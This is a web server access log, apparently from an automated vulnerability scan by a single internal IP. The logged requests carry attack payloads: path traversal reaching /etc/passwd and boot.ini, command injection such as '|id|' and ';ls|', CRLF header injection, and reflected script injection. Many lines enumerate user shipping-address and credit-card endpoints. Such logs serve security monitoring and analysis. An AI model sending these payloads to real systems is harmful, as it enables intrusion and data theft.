Created,Method,UriStem,UriQuery,IP,UserAgent,URL
2016-10-23 07:02:55,GET,/2014/users/2/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/10/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/,mode=album&album=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F&dispsize=640&start=0,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/8/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/5/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/2/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/10/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/index.phtml,mode=album&album=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F&dispsize=640&start=0,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/8/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/5/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/2/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/10/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/auctionweaver.pl,flag1=1&catdir=cat2&fromfile=..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/8/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/5/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/2/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/10/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,POST,/cart32.exe/cart32clientlist,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/8/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/5/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/2/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/10/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/web_store.cgi,page=../../../../../../../boot%00ini,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/8/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/5/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/2/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/10/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/shop.pl,page=..\..\..\..\..\..\boot.ini,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/8/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/5/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/2/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/10/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/shop.cgi,page=..\..\..\..\..\..\boot.ini,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/8/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/5/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/2/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/10/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/db2www,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/8/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/cgimail.exe,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/5/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/2/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2015/users/0/shipping_addresses,-,172.17.100.122,Mozilla/5.0+(Windows+NT+6.1;+WOW64;+rv:22.0)+Gecko/20100101+Firefox/22.0,-
2016-10-23 07:02:55,GET,/2014/users/8/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/visadmin.exe,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/5/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/2/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2015/users/1/shipping_addresses,-,172.17.100.122,Mozilla/5.0+(Windows+NT+6.1;+WOW64;+rv:22.0)+Gecko/20100101+Firefox/22.0,-
2016-10-23 07:02:55,GET,/2014/users/8/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/test.bat,|type%20c:\winnt\win.ini,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/5/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/2/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2015/users/2/shipping_addresses,-,172.17.100.122,Mozilla/5.0+(Windows+NT+6.1;+WOW64;+rv:22.0)+Gecko/20100101+Firefox/22.0,-
2016-10-23 07:02:55,GET,/2014/users/9/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/test.bat,|type%20c:\windows\win.ini,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/5/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/2/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2015/users/3/shipping_addresses,-,172.17.100.122,Mozilla/5.0+(Windows+NT+6.1;+WOW64;+rv:22.0)+Gecko/20100101+Firefox/22.0,-
2016-10-23 07:02:55,GET,/2014/users/9/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/input.bat,|type%20c:\winnt\win.ini,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/5/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/2/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2015/users/4/shipping_addresses,-,172.17.100.122,Mozilla/5.0+(Windows+NT+6.1;+WOW64;+rv:22.0)+Gecko/20100101+Firefox/22.0,-
2016-10-23 07:02:55,GET,/Cart32.exe/expdate,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/9/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/input.bat,|type%20c:\windows\win.ini,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/5/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2015/users/5/shipping_addresses,-,172.17.100.122,Mozilla/5.0+(Windows+NT+6.1;+WOW64;+rv:22.0)+Gecko/20100101+Firefox/22.0,-
2016-10-23 07:02:55,GET,/2014/users/9/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/input2.bat,|type%20c:\winnt\win.ini,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/ncbook/book.cgi,action=default&current=|id|&form_tid=996604045&prev=main.html&list_message_index=10,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/5/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2015/users/6/shipping_addresses,-,172.17.100.122,Mozilla/5.0+(Windows+NT+6.1;+WOW64;+rv:22.0)+Gecko/20100101+Firefox/22.0,-
2016-10-23 07:02:55,GET,/2014/users/9/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/input2.bat,|type%20c:\windows\win.ini,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/book.cgi,action=default&current=|id|&form_tid=996604045&prev=main.html&list_message_index=10,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/5/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2015/users/7/shipping_addresses,-,172.17.100.122,Mozilla/5.0+(Windows+NT+6.1;+WOW64;+rv:22.0)+Gecko/20100101+Firefox/22.0,-
2016-10-23 07:02:55,GET,/2014/users/9/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/verity97.vts,HLNavigate=On&querytext=dcm&ServerKey=Primary&ResultTemplate=../../../../../../../boot.ini&ResultStyle=simple&ResultCount=20&collection=books,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/status.php3,HordeSession=42,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/5/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2015/users/8/shipping_addresses,-,172.17.100.122,Mozilla/5.0+(Windows+NT+6.1;+WOW64;+rv:22.0)+Gecko/20100101+Firefox/22.0,-
2016-10-23 07:02:55,GET,/2014/users/9/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/classifieds.cgi,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/status.php3,HordeSession=42,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/5/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2015/users/9/shipping_addresses,-,172.17.100.122,Mozilla/5.0+(Windows+NT+6.1;+WOW64;+rv:22.0)+Gecko/20100101+Firefox/22.0,-
2016-10-23 07:02:55,GET,/2014/users/9/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/classified.cgi,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/status.php3,HordeSession=42,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/5/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2015/users/10/shipping_addresses,-,172.17.100.122,Mozilla/5.0+(Windows+NT+6.1;+WOW64;+rv:22.0)+Gecko/20100101+Firefox/22.0,-
2016-10-23 07:02:55,GET,/2014/users/9/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/classifieds/classifieds.cgi,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/shop.pl/SID=947626980.19094/page=;ls|,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/5/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/0/shipping_addresses,-,172.17.100.122,Mozilla/5.0+(Windows+NT+6.1;+WOW64;+rv:22.0)+Gecko/20100101+Firefox/22.0,-
2016-10-23 07:02:55,GET,/2014/users/9/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/classified/classified.cgi,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/htsearch,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/5/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/1/shipping_addresses,-,172.17.100.122,Mozilla/5.0+(Windows+NT+6.1;+WOW64;+rv:22.0)+Gecko/20100101+Firefox/22.0,-
2016-10-23 07:02:55,GET,/2014/users/9/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/login.php,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/finger,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/helpwin.gas.bat,mode=&draw=x&file=x&module=&locale=../../config/log.conf%00%5c&chapter=,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/5/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/2/shipping_addresses,-,172.17.100.122,Mozilla/5.0+(Windows+NT+6.1;+WOW64;+rv:22.0)+Gecko/20100101+Firefox/22.0,-
2016-10-23 07:02:55,GET,/finger.cgi,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/9/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/5/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/3/shipping_addresses,-,172.17.100.122,Mozilla/5.0+(Windows+NT+6.1;+WOW64;+rv:22.0)+Gecko/20100101+Firefox/22.0,-
2016-10-23 07:02:55,GET,/finger.pl,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/9/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/helpwin.gas.bat,mode=&draw=x&file=x&module=&locale=../../config/applist.conf%00%5c&chapter=,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/6/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/2014/users/4/shipping_addresses,-,172.17.100.122,Mozilla/5.0+(Windows+NT+6.1;+WOW64;+rv:22.0)+Gecko/20100101+Firefox/22.0,-
2016-10-23 07:02:55,GET,/filemail.pl,-,172.17.100.122,-,-
2016-10-23 07:02:55,GET,/modules.php,set_albumName=album01&id=aaw&op=modload&name=gallery&file=index&include=../../../../../../../../boot.ini,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2014/users/9/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2014/users/6/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2014/users/5/shipping_addresses,-,172.17.100.122,Mozilla/5.0+(Windows+NT+6.1;+WOW64;+rv:22.0)+Gecko/20100101+Firefox/22.0,-
2016-10-23 07:02:56,GET,/FILEMAIL.PL,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2014/users/9/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2014/users/6/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2014/users/6/shipping_addresses,-,172.17.100.122,Mozilla/5.0+(Windows+NT+6.1;+WOW64;+rv:22.0)+Gecko/20100101+Firefox/22.0,-
2016-10-23 07:02:56,GET,/filemail.cgi,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/faqmanager.cgi,toc=c:\boot.ini%00,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2014/users/9/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2014/users/7/shipping_addresses,-,172.17.100.122,Mozilla/5.0+(Windows+NT+6.1;+WOW64;+rv:22.0)+Gecko/20100101+Firefox/22.0,-
2016-10-23 07:02:56,GET,/2014/users/6/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/FILEMAIL.CGI,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/faqmanager.cgi,toc=faqmanager.cgi%00,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2014/users/9/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2014/users/8/shipping_addresses,-,172.17.100.122,Mozilla/5.0+(Windows+NT+6.1;+WOW64;+rv:22.0)+Gecko/20100101+Firefox/22.0,-
2016-10-23 07:02:56,GET,/2014/users/6/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/maillist.pl,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/faqmanager.cgi,toc=../../../../../../winnt/win.ini%00,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2014/users/9/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2014/users/9/shipping_addresses,-,172.17.100.122,Mozilla/5.0+(Windows+NT+6.1;+WOW64;+rv:22.0)+Gecko/20100101+Firefox/22.0,-
2016-10-23 07:02:56,GET,/2014/users/6/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/MAILLIST.PL,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/YaBB.cgi,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2014/users/9/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2014/users/10/shipping_addresses,-,172.17.100.122,Mozilla/5.0+(Windows+NT+6.1;+WOW64;+rv:22.0)+Gecko/20100101+Firefox/22.0,-
2016-10-23 07:02:56,GET,/maillist.cgi,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2014/users/6/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/YaBB.pl,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2014/users/9/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/test/users/1/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/MAILLIST.CGI,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2014/users/6/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/ikonboard.cgi,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2014/users/9/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2014/users/6/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/webfind.exe,keywords=QUALYS,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/article.php,article=12345&post=67890,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2014/users/6/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2014/users/9/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/..../winnt/repair/boot.ini,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2015/users/1/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:56,POST,/admin.php,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2014/users/6/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/rguest.exe,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2014/users/9/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2015/users/2/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/x_stat_admin.php,action=no_such_func,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/wguest.exe,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2014/users/6/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2014/users/9/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/test/users/1/credit_cards,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/x_stat_admin.php,action=phpinfo,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/ws_ftp.ini,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2014/users/6/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2014/users/9/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2014/users/6/credit_cards,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/x_stat_admin.php,action=phpinfo&<script>alert('j97w_qaf3')</script>,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/WS_FTP.INI,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2014/users/9/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2014/users/6/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2015/users/1/credit_cards,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/guest.php,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/home.php,arsc_language=xyz_123,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/quikstore.cfg,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2014/users/10/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2015/users/2/credit_cards,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/imlist.php,cwd=c:\,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/perlshop.cgi,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2014/users/10/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/bigsam.php,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/test/about,date=2013-11-14%0d%0aSet-Cookie:+QUALYSHTTPINJECTION,172.17.100.122,Mozilla/5.0+(Windows+NT+6.1;+WOW64;+rv:22.0)+Gecko/20100101+Firefox/22.0,-
2016-10-23 07:02:56,GET,/imlist.php,cwd=../../../../../../../../../,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/admin.php,admin=1,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/flexform.cgi,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2014/users/10/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/mmstdod.cgi,ALTERNATE_TEMPLATES=c:\winnt\win.ini%00,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2014/about,date=2013-11-14%0d%0aSet-Cookie:+QUALYSHTTPINJECTION,172.17.100.122,Mozilla/5.0+(Windows+NT+6.1;+WOW64;+rv:22.0)+Gecko/20100101+Firefox/22.0,-
2016-10-23 07:02:56,GET,/lwgate,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/mailman/mmstdod.cgi,ALTERNATE_TEMPLATES=c:\winnt\win.ini%00,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2014/users/10/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/error.php,e=<script>alert(qlys_tst_9713)</script>,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2015/about,date=2013-11-14%0d%0aSet-Cookie:+QUALYSHTTPINJECTION,172.17.100.122,Mozilla/5.0+(Windows+NT+6.1;+WOW64;+rv:22.0)+Gecko/20100101+Firefox/22.0,-
2016-10-23 07:02:56,GET,/lwgate.cgi,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/com.endymion.sake.servlet.mail.MailServlet,cmd_help=1&param_name=/boot.ini%00,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2014/users/10/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/user.php,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/test/users,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/,-,172.17.100.122,ZX-80+SPECTRUM,-
2016-10-23 07:02:56,GET,/com.endymion.sake.servlet.mail.MailServlet,cmd_help=1&param_name=c:\winnt\win.ini%00,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2014/users/10/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/user.php,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2014/users,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/categorie.php3,cid=u42u98,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2014/users/10/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/admin.html,-,172.17.100.122,-,-
2016-10-23 07:02:56,POST,/bslist.cgi,subscribe,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2015/users,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/index.html?+.htr,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/_vti_bin/_vti_adm,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/order.dll,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2014/users/10/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/config.php,-,172.17.100.122,-,-
2016-10-23 07:02:56,POST,/2014/contact,-,172.17.100.122,Mozilla/5.0+(Windows+NT+6.1;+WOW64;+rv:22.0)+Gecko/20100101+Firefox/22.0,-
2016-10-23 07:02:56,GET,/index.cgi,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/downloads.asp,Do=search&name=<script>alert(qlys_tst_9713)</script>,172.17.100.122,-,-
2016-10-23 07:02:56,POST,/2015/contact,-,172.17.100.122,Mozilla/5.0+(Windows+NT+6.1;+WOW64;+rv:22.0)+Gecko/20100101+Firefox/22.0,-
2016-10-23 07:02:56,GET,/_vti_bin/_vti_aut,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/,"><script>alert(document.domain)</script>,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/search/search.pl,Realm=All&Match=0&Terms=day&nocpp=1&maxhits=10&Rank=<br><h1><script>alert(987)</script></h1>,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/modules.php,op=modload&name=PostBoard&file=index,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/test/users/1/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/passwd.cgi,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/add.php3,adurl=http%3A%2F%2Fwww.qualys.com%2Fimages%2Flogos%2Flogo_qualys.gif&url=http%3A%2F%2Fwww.qualys.com,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2014/users/6/shipping_addresses,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/calendar_admin.cgi,config=%7Carp%7C,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/_vti_bin/_vti_aut/fp30reg.dll,<script>alert(6329)</script>,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/add.php3,adurl=cfyz&url='><script>alert(document.domain)</script><,172.17.100.122,-,-
2016-10-23 07:02:56,POST,/test/guestbook_entries,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/calendar_admin.pl,config=%7Carp%7C,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/_vti_bin/_vti_aut/fp30reg.dll,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/secure.php,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/2014/guestbook_entries/new,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/cart32.exe,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/htsearch,words=%22%3E%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/ch_info.php,-,172.17.100.122,-,-
2016-10-23 07:02:56,POST,/2014/guestbook_entries,-,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/htsearch.cgi,words=%22%3E%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/ceilidh.cgi/yop/,N4,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/search.asp,query="><script>alert(document.cookie)</script>,172.17.100.122,-,-
2016-10-23 07:02:56,GET,/ch_info.php,-,172.17.100.122,-,-
2016-10-23 07:02:56,POST,/2015/guestbook_entries,-,172.17.100.122,-,-
